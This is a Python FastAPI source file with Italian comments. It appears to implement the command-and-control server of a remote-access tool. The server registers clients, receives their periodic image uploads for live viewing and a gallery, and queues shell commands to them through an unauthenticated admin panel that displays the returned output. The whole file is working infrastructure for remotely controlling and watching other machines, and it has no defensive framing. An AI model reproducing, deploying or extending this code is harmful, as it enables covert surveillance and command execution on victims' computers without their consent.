
from fastapi import FastAPI, UploadFile, File, Form
from fastapi.responses import FileResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.requests import Request
import shutil
import os
import uuid
from typing import Dict

app = FastAPI()

# Static files (to serve the latest image)
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")


# Stato del server
clients_commands: Dict[str, str] = {}
clients_outputs: Dict[str, str] = {}
enable_image_upload = True


@app.post("/upload-image")
async def upload_image(client_id: str = Form(...), file: UploadFile = File(...)):
    if not enable_image_upload:
        return {"status": "image upload disabled"}

    path = f"static/{client_id}"
    os.makedirs(path, exist_ok=True)

    filepath = os.path.join(path, "latest.jpg")
    with open(filepath, "wb") as f:
        f.write(await file.read())
    
    return {"status": "ok"}



@app.get("/register")
async def register_client():
    client_id = str(uuid.uuid4())
    return {"client_id": client_id}



@app.get("/viewer/{client_id}", response_class=HTMLResponse)
async def get_viewer(request: Request, client_id: str):
    image_path = f"/static/{client_id}/latest.jpg"
    return f"""
    <html>
    <body style="background:black;">
        <h2 style="color:white;">Viewer - {client_id}</h2>
        <img src="{image_path}" style="width:100%;" />
    </body>
    </html>
    """


@app.get("/gallery", response_class=HTMLResponse)
async def get_gallery(request: Request):
    images = sorted(
        [f for f in os.listdir("static") if f.endswith(".jpg") and f != "latest.jpg"],
        reverse=True
    )
    return templates.TemplateResponse("gallery.html", {"request": request, "images": images})

current_command = ""
last_output = ""

@app.post("/set-command")
async def set_command(client_id: str = Form(...), command: str = Form(...)):
    clients_commands[client_id] = command
    return {"status": "ok"}

@app.get("/command/{client_id}")
async def get_command(client_id: str):
    cmd = clients_commands.pop(client_id, "")
    return {"command": cmd}


@app.post("/command-result")
async def receive_result(client_id: str = Form(...), output: str = Form(...)):
    clients_outputs[client_id] = output
    return {"status": "received"}

@app.get("/command-result/{client_id}")
async def get_result(client_id: str):
    return {"output": clients_outputs.get(client_id, "")}


# --------------------------
# ✅ INTERFACCIA /admin
# --------------------------
@app.get("/admin", response_class=HTMLResponse)
async def admin_page():
    client_list = list(clients_outputs.keys())
    client_options = "".join([f"<option value='{c}'>{c}</option>" for c in client_list])
    image_status = "ON" if enable_image_upload else "OFF"

    return f"""
    <html>
    <head>
        <title>Admin Panel</title>
        <style>
            body {{ font-family: monospace; background: #111; color: #eee; padding: 2rem; }}
            select, input, textarea, button {{ width: 100%; margin-top: 1rem; background: #222; color: #0f0; border: none; padding: 0.5rem; font-family: monospace; }}
        </style>
        <script>
            async function sendCommand() {{
                const clientId = document.getElementById('client').value;
                const cmd = document.getElementById('command').value;
                await fetch('/set-command', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
                    body: 'client_id=' + encodeURIComponent(clientId) + '&command=' + encodeURIComponent(cmd)
                }});
                document.getElementById('output').value = "In attesa di risposta...";
                setTimeout(() => fetchOutput(clientId), 5000);
            }}

            async function fetchOutput(clientId) {{
                const res = await fetch('/command-result/' + clientId);
                const json = await res.json();
                document.getElementById('output').value = json.output;
            }}

            async function toggleUpload() {{
                const res = await fetch('/toggle-upload');
                location.reload();
            }}
        </script>
    </head>
    <body>
        <h2>Admin - Client Command Panel</h2>
        <label>Client:</label>
        <select id="client">{client_options}</select>
        <input type="text" id="command" placeholder="es: ipconfig" />
        <button onclick="sendCommand()">Invia</button>
        <textarea id="output" rows="10" placeholder="Output..."></textarea>

        <hr/>
        <h3>🖼 Upload immagini: {image_status}</h3>
        <button onclick="toggleUpload()">Abilita / Disabilita</button>
    </body>
    </html>
    """


@app.get("/toggle-upload")
async def toggle_upload():
    global enable_image_upload
    enable_image_upload = not enable_image_upload
    return {"enabled": enable_image_upload}

@app.get("/", response_class=HTMLResponse)
async def root():
    return '<h2>✅ Server attivo. Vai su <a href="/viewer">/viewer</a> o <a href="/gallery">/gallery</a></h2>'
